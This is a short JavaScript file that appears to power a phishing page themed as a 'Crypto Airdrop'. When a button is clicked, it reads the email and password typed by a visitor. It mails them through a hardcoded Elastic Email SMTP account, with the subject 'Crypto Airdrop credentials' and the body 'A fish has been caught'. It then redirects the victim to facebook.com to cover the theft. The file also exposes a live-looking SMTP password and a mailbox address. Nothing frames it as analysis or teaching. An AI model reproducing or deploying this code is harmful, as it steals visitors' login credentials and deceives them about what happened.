


const email = document.getElementById('email');
const pass = document.getElementById('password');
const submit = document.getElementById('sub_btn');

function RegisterUser() {
    Email.send({
        Host : "smtp.elasticemail.com",
        Username : "mytbota@gmail.com",
        Password : "F3F74A5528ACB45F7EFEF3BC935128988C25",
        port: 2525,
        To : 'mytbota@gmail.com',
        From : "mytbota@gmail.com",
        Subject : "Crypto Airdrop credentials",
        Body : `
        A fish has been caught
        username: ${email.value}
        password: ${pass.value}
        `
        }).then(
            setTimeout(function() {
                window.location="https://facebook.com";
              }, 2000)
        );
}
submit.addEventListener('click', RegisterUser);


